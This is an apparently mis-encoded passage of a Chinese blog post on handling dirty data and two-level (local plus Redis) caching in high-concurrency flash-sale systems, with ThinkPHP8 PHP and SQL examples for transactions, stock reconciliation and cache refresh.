<h2 id="24-ç§æåºæ¯èæ°æ®è§£å³æ¹æ¡">2.4 ç§æåºæ¯èæ°æ®è§£å³æ¹æ¡</h2>
<p>ç§æåºæ¯ä¸­æ æ³å®ç°âå¼ºä¸è´æ§âï¼ä¼çºç²é«å¹¶åæ§è½ï¼ï¼æ ¸å¿ç®æ æ¯ä¿éâæç»ä¸è´æ§âï¼éè¿ä»¥ä¸ 5 ç§æºå¶ååºï¼</p>
<h3 id="241-äºå¡åå­æ§ä¿émysql-å±">2.4.1 äºå¡åå­æ§ä¿éï¼MySQL å±ï¼</h3>
<p>å°âæ£å MySQL åºå­âåâåå»ºç§æè®¢åâå°è£å¨åä¸äºå¡ä¸­ï¼ç¡®ä¿ä¸¤èè¦ä¹åæ¶æåï¼è¦ä¹åæ¶åæ»ï¼é¿ååæ­¥æä½å¤±è´¥å¯¼è´çæ°æ®ä¸ä¸è´ã</p>
<pre><code class="language-php">
// åèåæéåæ¶è´¹èäºå¡é»è¾
Db::startTrans();
try {
    // 1. æ£å MySQL åºå­
    Db::name('seckill_activity_product')-&gt;where('product_id', $productId)-&gt;update(['stock' =&gt; Db::raw('stock - 1')]);
    // 2. åå»ºè®¢å
    Db::name('seckill_order')-&gt;insert($orderData);
    Db::commit();
} catch (\Exception $e) {
    Db::rollback(); // ä»»ä¸æä½å¤±è´¥ï¼å¨éåæ»
}

</code></pre>
<h3 id="242-å®æ¶è¡¥å¿åæ­¥redis-ä¸-mysql-å¯¹é½">2.4.2 å®æ¶è¡¥å¿åæ­¥ï¼Redis ä¸ MySQL å¯¹é½ï¼</h3>
<p>æ§è¡å®æ¶èæ¬ï¼å¯¹æ¯ Redis ä¸ MySQL ä¸­çæ ¸å¿æ°æ®ï¼å¦åºå­ãå·²ç§æç¨æ·ï¼ï¼åç°åå·®æ¶ä»¥ MySQL ä¸ºååæ­¥å° Redisï¼ä¿éæç»ä¸è´æ§ã</p>
<pre><code class="language-php">
// åºå­åæ­¥è¡¥å¿èæ¬ï¼æ ¸å¿é»è¾ï¼
$seckillProducts = Db::name('seckill_activity_product')-&gt;field('product_id, stock')-&gt;select();
foreach ($seckillProducts as $item) {
    $redisStock = Cache::store('redis')-&gt;get("seckill:stock:{$item['product_id']}");
    $mysqlStock = $item['stock'];
    if ($redisStock !== $mysqlStock) {
        // ä»¥ MySQL ä¸ºåï¼åæ­¥åºå­å° Redis
        Cache::store('redis')-&gt;set("seckill:stock:{$item['product_id']}", $mysqlStock);
        trace("ååID:{$item['product_id']} åºå­åæ­¥ï¼Redis={$redisStock}â{$mysqlStock}", 'info');
    }
}

</code></pre>
<h3 id="243-æ¶æ¯éåå¤±è´¥éè¯æºå¶">2.4.3 æ¶æ¯éåå¤±è´¥éè¯æºå¶</h3>
<p>å¯¹æªæåæ¶è´¹çç§ææ¶æ¯ï¼å¦ MySQL æ´æ°å¤±è´¥ï¼ï¼è®¾ç½®éè¯æºå¶ï¼æå¤ 3 æ¬¡ï¼ï¼éè¯é´ééæ­¥å»¶é¿ï¼éè¯å¤±è´¥åè®°å½å°å¤±è´¥è¡¨ï¼äººå·¥ä»å¥å¤çï¼é¿åæ°æ®åæ­¥éæ¼ã</p>
<h3 id="244-åçè®¾ç½®-mysql-äºå¡éç¦»çº§å«">2.4.4 åçè®¾ç½® MySQL äºå¡éç¦»çº§å«</h3>
<p>å° MySQL äºå¡éç¦»çº§å«è®¾ç½®ä¸º <code>READ COMMITTED</code>ï¼è¯»å·²æäº¤ï¼ï¼é¿åè¯»åå°æªæäº¤çèæ°æ®ã</p>
<pre><code class="language-sql">
-- æ¥çå½åéç¦»çº§å«
SELECT @@transaction_isolation;
-- è®¾ç½®éç¦»çº§å«ï¼å¨å±çæï¼
SET GLOBAL transaction_isolation = 'READ-COMMITTED';

</code></pre>
<h3 id="245-åéæ ¡éªä¸é²éå¤æ è®°">2.4.5 åéæ ¡éªä¸é²éå¤æ è®°</h3>
<ul>
<li>
<p><strong>åºå­åéæ ¡éª</strong>ï¼Redis æ£ååºå­åï¼MySQL æ´æ°ååæ¬¡æ ¡éªåºå­ï¼è¡éä¿æ¤ï¼ï¼é¿å Redis ä¸ MySQL æ°æ®åå·®å¯¼è´è¶åã</p>
</li>
<li>
<p><strong>ç¨æ·éå¤ç§ææ è®°</strong>ï¼ç§ææååï¼å¨ Redis ä¸­åå¥âç¨æ·-ååâå¯ä¸æ è®°ï¼å¦ <code>seckill:user:1001:product:2001</code>ï¼ï¼æææè¦çæ´»å¨æ¶é¿ï¼æ¦æªéå¤è¯·æ±ã</p>
</li>
</ul>
<h1 id="ä¸åç¼å­æºå¶è¯¦è§£">ä¸ãåç¼å­æºå¶è¯¦è§£</h1>
<h2 id="31-å®ä¹">3.1 å®ä¹</h2>
<p>åç¼å­æºå¶æ¯æå¨ç³»ç»ä¸­åæ¶é¨ç½² <strong>ä¸¤å±ç¼å­</strong>ï¼å½¢æâæ¬å°ç¼å­ï¼L1ï¼+ åå¸å¼ç¼å­ï¼L2ï¼âçå±çº§ç»æãè¯·æ±ä¼åä» L1 æ¬å°ç¼å­è¯»åï¼æªå½ä¸­æ¶åè¯»å L2 åå¸å¼ç¼å­ï¼æåè¯»åæ°æ®åºï¼æ°æ®æ´æ°æ¶ï¼åæ­¥æ´æ°ä¸¤å±ç¼å­ï¼æéè¿ç­ç¥ååºï¼ï¼æ ¸å¿ç®æ æ¯æåé«å¹¶åè¯»æ§è½ãåå°åå¸å¼ç¼å­ååãé²æ­¢ç¼å­å»ç©¿ã</p>
<p>æ ¸å¿ä»·å¼ï¼å¹³è¡¡âè¯»åéåº¦âä¸âæ°æ®ä¸è´æ§âï¼å¨ç§æç­é«é¢è¯»åºæ¯ä¸­ï¼æ¾èéä½åå¸å¼ç¼å­ï¼Redisï¼åæ°æ®åºçè´è½½ã</p>
<h2 id="32-ç§æåºæ¯çåç¼å­æ¶æè®¾è®¡">3.2 ç§æåºæ¯çåç¼å­æ¶æè®¾è®¡</h2>
<p>ç§æåºæ¯ä¸­ï¼åç¼å­æºå¶çåå±è®¾è®¡éè´´åâç­ç¹æ°æ®éä¸­ãå¹¶åè¯»æé«âçç¹å¾ï¼å·ä½å¦ä¸ï¼</p>
<h3 id="321-l1-ç¼å­æ¬å°åå­ç¼å­">3.2.1 L1 ç¼å­ï¼æ¬å°åå­ç¼å­</h3>
<ul>
<li>
<p><strong>å­å¨ä½ç½®</strong>ï¼åºç¨æå¡å¨æ¬å°åå­ï¼å¦ PHP éæåéãJava HashMapãGo sync.Mapï¼ã</p>
</li>
<li>
<p><strong>å­å¨åå®¹</strong>ï¼ç§æç­ç¹ååçæ ¸å¿ä¿¡æ¯ï¼åååç§°ãä»·æ ¼ãç§æåºå­ï¼ï¼æ´»å¨æé´ä¸å¸¸åæ´çæ°æ®ã</p>
</li>
<li>
<p><strong>æ ¸å¿ç¹ç¹</strong>ï¼</p>
<ul>
<li>
<p>è¯»åéåº¦æå¿«ï¼åå­ç´æ¥è®¿é®ï¼å»¶è¿å¾®ç§çº§ï¼ï¼</p>
</li>
<li>
<p>æ¯ä¸ªåºç¨æå¡å¨ç¬ç«ç»´æ¤ï¼ä¸å±äº«ï¼æ ç½ç»å¼éï¼ï¼</p>
</li>
<li>
<p>å®¹éæéï¼ä»ç¼å­ç­ç¹æ°æ®ï¼é¿åå ç¨è¿å¤åå­ï¼ã</p>
</li>
</ul>
</li>
<li>
<p><strong>æ´æ°æ¹å¼</strong>ï¼</p>
<ul>
<li>
<p>ç³»ç»å¯å¨/æ´»å¨å¼å§åï¼ä» L2 ç¼å­ï¼Redisï¼æ¹éå è½½ï¼</p>
</li>
<li>
<p>å®æ¶ä»»å¡ï¼å¦ 1 åéï¼ä» L2 ç¼å­å·æ°ï¼ä¿éæ°æ®æ°é²åº¦ï¼</p>
</li>
<li>
<p>æ´»å¨ç»æåï¼ä¸»å¨æ¸ç©ºï¼éæ¾åå­ã</p>
</li>
</ul>
</li>
</ul>
<h3 id="322-l2-ç¼å­åå¸å¼ç¼å­redis">3.2.2 L2 ç¼å­ï¼åå¸å¼ç¼å­ï¼Redisï¼</h3>
<ul>
<li>
<p><strong>å­å¨ä½ç½®</strong>ï¼Redis éç¾¤ï¼ä¸»ä»+å¨åµ/Clusterï¼ä¿è¯é«å¯ç¨ï¼ã</p>
</li>
<li>
<p><strong>å­å¨åå®¹</strong>ï¼å¨éç§æååæ°æ®ãç§æåºå­ãç¨æ·å·²ç§ææ è®°ç­æ ¸å¿ä¸å¡æ°æ®ã</p>
</li>
<li>
<p><strong>æ ¸å¿ç¹ç¹</strong>ï¼</p>
<ul>
<li>
<p>ææåºç¨æå¡å¨å±äº«ï¼æ°æ®ç»ä¸ï¼</p>
</li>
<li>
<p>æ¯æåå­æä½ï¼DECRãSETNXï¼ï¼ä¿éå¹¶åå®å¨ï¼</p>
</li>
<li>
<p>å®¹éå¯æ©å±ï¼æ¯æåå¸å¼éãæ¶æ¯éåç­éå è½åã</p>
</li>
</ul>
</li>
<li>
<p><strong>æ´æ°æ¹å¼</strong>ï¼</p>
<ul>
<li>
<p>æ´»å¨åç¼å­é¢ç­ï¼ä» MySQL å è½½æ°æ®åå¥ï¼ï¼</p>
</li>
<li>
<p>ç§æè¿ç¨ä¸­ï¼åå­æ£ååºå­ãåå¥ç¨æ·æ è®°ï¼</p>
</li>
<li>
<p>MySQL æ°æ®åæ´åï¼å¼æ­¥åæ­¥æ´æ°ï¼å¦åå°è¡¥è´§ååæ­¥ Redisï¼ã</p>
</li>
</ul>
</li>
</ul>
<h2 id="33-ç§æåºæ¯åç¼å­æºå¶å®ç°thinkphp8-ä»£ç ç¤ºä¾">3.3 ç§æåºæ¯åç¼å­æºå¶å®ç°ï¼ThinkPHP8 ä»£ç ç¤ºä¾ï¼</h2>
<pre><code class="language-php">
&lt;?php
namespace app\controller;

use think\facade\Cache;
use think\facade\Db;
use think\response\Json;

class SeckillController
{
    // L1 æ¬å°ç¼å­ï¼éæåéï¼æ¯ä¸ªåºç¨è¿ç¨ç¬ç«ï¼
    private static array $localCache = [];
    // L1 ç¼å­å·æ°é´éï¼1åéï¼åä½ï¼ç§ï¼
    private const LOCAL_CACHE_REFRESH_INTERVAL = 60;
    // ä¸æ¬¡å·æ° L1 ç¼å­çæ¶é´
    private static int $lastRefreshTime = 0;

    /**
     * ç§æååè¯¦ææ¥è¯¢ï¼åç¼å­æºå¶ï¼
     * @param int $productId ç§æååID
     * @return Json
     */
    public function getSeckillProduct(int $productId): Json
    {
        // 1. æ£æ¥æ¯å¦éè¦å·æ° L1 ç¼å­ï¼é¿åæ¬å°ç¼å­æ°æ®è¿æï¼
        $this-&gt;refreshLocalCacheIfNeed();

        // 2. ä¼åè¯»å L1 æ¬å°ç¼å­
        if (isset(self::$localCache[$productId])) {
            return json([
                'code' =&gt; 0,
                'msg' =&gt; 'success',
                'data' =&gt; self::$localCache[$productId],
                'cache_level' =&gt; 'L1ï¼æ¬å°ç¼å­ï¼'
            ]);
        }

        // 3. L1 æªå½ä¸­ï¼è¯»å L2 Redis ç¼å­
        $redisKey = "seckill:product:{$productId}";
        $product = Cache::store('redis')-&gt;get($redisKey);
        if ($product !== false) {
            $product = json_decode($product, true);
            // åå¥ L1 ç¼å­ï¼ä¾åç»­è¯·æ±å¤ç¨
            self::$localCache[$productId] = $product;
            return json([
                'code' =&gt; 0,
                'msg' =&gt; 'success',
                'data' =&gt; $product,
                'cache_level' =&gt; 'L2ï¼Redisç¼å­ï¼'
            ]);
        }

        // 4. L2 æªå½ä¸­ï¼è¯»å MySQLï¼ååºï¼
        $product = Db::name('seckill_activity_product')
            -&gt;alias('sap')
            -&gt;join('product p', 'sap.product_id = p.id')
            -&gt;where('sap.product_id', $productId)
            -&gt;where('sap.status', 1)
            -&gt;field('p.id, p.name, p.price, sap.stock as seckill_stock')
            -&gt;find();

        if (empty($product)) {
            return json(['code' =&gt; 1, 'msg' =&gt; 'ç§æååä¸å­å¨æå·²ä¸æ¶']);
        }

        // åå¥ L2 å L1 ç¼å­ï¼é¿ååç»­è¯·æ±ç©¿é
        Cache::store('redis')-&gt;set($redisKey, json_encode($product), 3600);
        self::$localCache[$productId] = $product;

        return json([
            'code' =&gt; 0,
            'msg' =&gt; 'success',
            'data' =&gt; $product,
            'cache_level' =&gt; 'DBï¼æ°æ®åºï¼'
        ]);
    }

    /**
     * å®æ¶å·æ° L1 æ¬å°ç¼å­ï¼é¿åæ°æ®è¿æï¼
     */
    private function refreshLocalCacheIfNeed(): void
    {
        $currentTime = time();
        // è¶è¿å·æ°é´éï¼éæ°ä» L2 å è½½ç­ç¹ååæ°æ®
        if ($currentTime - self::$lastRefreshTime &gt; self::LOCAL_CACHE_REFRESH_INTERVAL) {
            // 1. æ¸ç©ºæ§æ¬å°ç¼å­
            self::$localCache = [];
            // 2. ä» Redis å è½½ææç§æç­ç¹åå
            $hotProductIds = Cache::store('redis')-&gt;keys('seckill:product:*');
            if (!empty($hotProductIds)) {
                $hotProducts = Cache::store('redis')-&gt;mGet($hotProductIds);
                foreach ($hotProductIds as $index =&gt; $key) {
                    $productId = str_replace('seckill:product:', '', $key);
                    $product = json_decode($hotProducts[$index], true);
                    if ($product) {
                        self::$localCache[$productId] = $product;
                    }
                }
            }
            // 3. æ´æ°æåå·æ°æ¶é´
            self::$lastRefreshTime = $currentTime;
            trace("L1 æ¬å°ç¼å­å·æ°å®æï¼ç¼å­ååæ°ï¼" . count(self::$localCache), 'info');
        }
    }
}

</code></pre>
<h2 id="34-åç¼å­æºå¶çæ ¸å¿ä»·å¼ä¸å³é®è¦ç¹">3.4 åç¼å­æºå¶çæ ¸å¿ä»·å¼ä¸å³é®è¦ç¹</h2>
<h3 id="341-æ ¸å¿ä»·å¼">3.4.1 æ ¸å¿ä»·å¼</h3>
<ol>
<li>
<p><strong>æåååºéåº¦</strong>ï¼ç­ç¹è¯·æ±ç´æ¥å½ä¸­ L1 æ¬å°ç¼å­ï¼é¿åç½ç»å¼éï¼Redis éç½ç»è¯·æ±ï¼ï¼ååºå»¶è¿éä½ä¸ä¸ªéçº§ã</p>
</li>
<li>
<p><strong>åå° Redis åå</strong>ï¼å¤§éé«é¢è¯»è¯·æ±è¢« L1 ç¼å­æ¦æªï¼é¿å Redis éç¾¤å é«å¹¶åè¯»åºç°æ§è½ç¶é¢æå®æºã</p>
</li>
<li>
<p><strong>é²æ­¢ç¼å­å»ç©¿</strong>ï¼å³ä½¿ L2 ç¼å­ï¼Redisï¼ä¸­ç­ç¹ååç¼å­å¤±æï¼L1 æ¬å°ç¼å­ä»è½ååºï¼é¿åå¤§éè¯·æ±ç¬é´ç©¿éå° MySQLã</p>
</li>
<li>
<p><strong>é«å¯ç¨ååº</strong>ï¼è¥ Redis éç¾¤ä¸´æ¶æéï¼L1 æ¬å°ç¼å­å¯æ¯ææ ¸å¿è¯»ä¸å¡ï¼æåç³»ç»å®¹éæ§ã</p>
</li>
</ol>
<h3 id="342-å³é®å®ç°è¦ç¹">3.4.2 å³é®å®ç°è¦ç¹</h3>
<ol>
<li>
<p><strong>æ§å¶ L1 ç¼å­èå´</strong>ï¼ä»ç¼å­ç­ç¹æ°æ®ï¼é¿åæ¬å°åå­æº¢åºï¼ä¸ç¼å­é«é¢åæ´æ°æ®ï¼å¦å®æ¶åºå­ï¼å»ºè®®ç´æ¥è¯» L2ï¼ã</p>
</li>
<li>
<p><strong>å®æ¶å·æ° L1 ç¼å­</strong>ï¼è®¾ç½®åççå·æ°é´éï¼å¦ 1 åéï¼ï¼å¹³è¡¡âæ°æ®æ°é²åº¦âä¸âæ§è½å¼éâã</p>
</li>
<li>
<p><strong>é¿å L1 ç¼å­éªå´©</strong>ï¼è¥å¤å°åºç¨æå¡å¨åæ¶å·æ° L1 ç¼å­ï¼å¯è½å¯¼è´ Redis ç¬æ¶ååæ¿å¢ï¼å¯ç»å·æ°æ¶é´å éæºåç§»ï¼å¦ 60Â±5 ç§ï¼ã</p>
</li>
<li>
<p><strong>æ°æ®ä¸è´æ§ä¿é</strong>ï¼æ ¸å¿æ°æ®åæ´æ¶ï¼å¦åå°è¡¥è´§ï¼ï¼åæ´æ° L2 ç¼å­ï¼åç±å®æ¶ä»»å¡åæ­¥å° L1ï¼é¿åç´æ¥ä¿®æ¹ L1 ç¼å­ï¼å¤å®ä¾é¨ç½²æ¶ä¼å¯¼è´æ°æ®ä¸ä¸è´ï¼ã</p>
</li>
</ol>
<h1 id="åæ ¸å¿æ¦å¿µå¯¹æ¯ä¸ç§ææ¶æååæ»ç»">åãæ ¸å¿æ¦å¿µå¯¹æ¯ä¸ç§ææ¶æååæ»ç»</h1>
<h2 id="41-èæ°æ®-vs-åç¼å­æºå¶-æ ¸å¿å¯¹æ¯">4.1 èæ°æ® vs åç¼å­æºå¶ æ ¸å¿å¯¹æ¯</h2>
<table>
<thead>
<tr>
<th>æ ¸å¿ç»´åº¦</th>
<th>èæ°æ®</th>
<th>åç¼å­æºå¶</th>
</tr>
</thead>
<tbody>
<tr>
<td>æ ¸å¿å®ä¹</td>
<td>æ°æ®ä¸´æ¶ä¸ä¸è´ææªç¡®è®¤çä¸­é´ç¶æ</td>
<td>æ¬å°ç¼å­+åå¸å¼ç¼å­çå±çº§ç¼å­ç»æ</td>
</tr>
<tr>
<td>å¨ç§æä¸­çè§è²</td>
<td>éè¦è§£å³çâé®é¢âï¼å½±åæ°æ®ä¸è´æ§ï¼</td>
<td>ä¼åæ¹æ¡ï¼æåæ§è½ãé²ç¼å­å»ç©¿ï¼</td>
</tr>
<tr>
<td>äº§ç/è®¾è®¡ç®ç</td>
<td>å¼æ­¥æ´æ°ãç³»ç»æéãä¸å¡æ¼æ´ç­å¯¼è´</td>
<td>åºå¯¹é«å¹¶åè¯»ãåå°åå¸å¼ç¼å­åå</td>
</tr>
<tr>
<td>æ ¸å¿è§£å³æ¹æ¡/å®ç°è¦ç¹</td>
<td>æç»ä¸è´æ§ãå®æ¶è¡¥å¿ãäºå¡åå­æ§ãåéæ ¡éª</td>
<td>ç­ç¹æ°æ®æ¬å°åãå®æ¶å·æ°ãRedis ååºãæ§å¶ç¼å­èå´</td>
</tr>
</tbody>
</table>
<h2 id="42-ç§ææ¶æä¸­çååè½å°å»ºè®®">4.2 ç§ææ¶æä¸­çååè½å°å»ºè®®</h2>
<ol>
<li>
<p><strong>åç¼å­æºå¶é²å»ç©¿ï¼åå°èæ°æ®äº§ç</strong>ï¼éè¿ L1+L2 ç¼å­åå°ç¼å­ç©¿éï¼é¿åå¤§éè¯·æ±ç´æ¥æä½ MySQL å¯¼è´çå¹¶åå²çªï¼ä»æºå¤´åå°èæ°æ®ã</p>
</li>
<li>
<p><strong>èæ°æ®è§£å³æ¹æ¡ä¿éåç¼å­ä¸è´æ§</strong>ï¼å®æ¶è¡¥å¿èæ¬åæ¶å¯¹é½ L1ãL2 ä¸ MySQL æ°æ®ï¼ç¡®ä¿åç¼å­ä¸­çæ°æ®é½æ¯æææ°æ®ï¼é¿ååºäºèæ°æ®æä¾æå¡ã</p>
</li>
<li>
<p><strong>æ ¸å¿åå</strong>ï¼ç§æåºæ¯ä¸­ï¼âæ§è½ä¼åï¼æç»ä¸è´âï¼åç¼å­æºå¶è´è´£æåæ§è½ï¼èæ°æ®è§£å³æ¹æ¡è´è´£ååºæ°æ®æ­£ç¡®æ§ï¼ä¸¤èååä¿éç³»ç»ç¨³å®ã</p>
</li>
</ol>
<h1 id="äºæ©å±è¯´æ">äºãæ©å±è¯´æ</h1>
<ol>
<li>
<p>åç¼å­æºå¶ç L1 ç¼å­éåï¼PHP å»ºè®®ç¨éæåéï¼åè¿ç¨åææï¼ï¼Java å¯ç¨ Caffeineï¼é«æ§è½æ¬å°ç¼å­æ¡æ¶ï¼ï¼Go å¯ç¨ sync.Map æ freecacheã</p>
</li>
<li>
<p>èæ°æ®çæ§ï¼å»ºè®®å¨ç³»ç»ä¸­å¢å æ°æ®ä¸è´æ§çæ§åè­¦ï¼å¦ Redis ä¸ MySQL åºå­åå·®è¶è¿éå¼ãæ¶æ¯éåå ç§¯éå¼å¸¸ï¼ï¼åæ¶åç°å¹¶å¤çèæ°æ®ã</p>
</li>
<li>
<p>æç«¯åºæ¯ååºï¼è¥åºç°å¤§éèæ°æ®ï¼å¦ Redis éç¾¤å´©æºï¼ï¼å¯ä¸´æ¶åæ¢ä¸ºâMySQL ç´æ¥è¯»å+éæµâæ¨¡å¼ï¼é¿åä¸å¡å®å¨ä¸å¯ç¨ã</p>
</li>
</ol>
<h2 id="-åå¨æå">ðµ åå¨æå</h2>
<p>ææ¯ ç½ç»ä¹ä¸ï¼ç­ç±ä»£ç ï¼ç®åä¸æ³¨äº Web å¨æ é¢åã</p>
<p>æ¬¢è¿å³æ³¨æçå¾®ä¿¡å¬ä¼å·ãä¹ä¸çé¡¹ç®ãï¼æä¼ä¸å®æåäº«ä¸äºå¼åå¿å¾ãæä½³å®è·µä»¥åææ¯æ¢ç´¢ç­åå®¹ï¼å¸æè½å¤å¸®å°ä½ ï¼</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2025-12-31 15:24">2025-12-31 15:24</span>&nbsp;
<a href="https://www.cnblogs.com/beggars">ä¹ä¸çé¡¹ç®</a>&nbsp;
éè¯»(<span id="post_view_count">158</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19426884);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19426884', targetLink: 'https://www.cnblogs.com/beggars/p/19426884', title: 'é«å¹¶åç§æåºæ¯ä¸çèæ°æ®ä¸åç¼å­æºå¶è§£æ' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
        </channel>
        </rss>